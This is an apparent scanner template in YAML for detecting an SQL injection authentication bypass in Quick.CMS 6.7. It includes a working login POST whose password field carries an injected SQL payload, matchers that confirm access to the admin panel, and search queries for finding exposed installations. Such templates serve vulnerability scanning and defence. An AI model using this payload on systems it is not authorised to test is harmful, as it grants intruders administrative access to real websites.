id: quick-cms-sqli
info:
  name: Quick.CMS v6.7 - SQL Injection
  author: s4e-io
  severity: high
  description: |
    Quick.CMS version 6.7 suffers from a remote SQL injection vulnerability that allows for authentication bypass.
  reference:
    - https://packetstormsecurity.com/files/177657/Quick.CMS-6.7-SQL-Injection.html
    - https://www.exploit-db.com/exploits/51910
  classification:
    cwe-id:
      - CWE-89
    cpe: cpe:2.3:a:opensolution:quick.cms:*:*:*:*:*:*:*:*
  metadata:
    runzero-match: service["http.body"] matches "(?i)Quick\\.Cms v6\\.7"
    fofa-query: body="Quick.Cms v6.7"
    max-request: 1
    product: quick.cms
    vendor: opensolution
    verified: true
  tags: cms,packetstorm,quickcms,sqli,vuln
http:
  - host-redirects: true
    matchers:
      - condition: and
        part: body
        type: word
        words:
          - Log out</a>
          - Settings</a>
          - Plugins</a>
      - status:
          - 200
        # digest: 4a0a00473045022100d0cf8f82ee0f4e2e81479b765d3da7351b3e714a1c3ec43edf8018d57d00cc750220559048246f369e3e4a357858dbf1cb28d685fa1066f24c87eb2ad9c27e1fc3d0:922c64590222798bb761d5b6d8e72950

        type: status
    matchers-condition: and
    max-redirects: 2
    raw:
      - |
        POST /admin.php?p=login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        sEmail=test%40test.net&sPass=%27+or+1%5D%2500&bAcceptLicense=1&iAcceptLicense=true
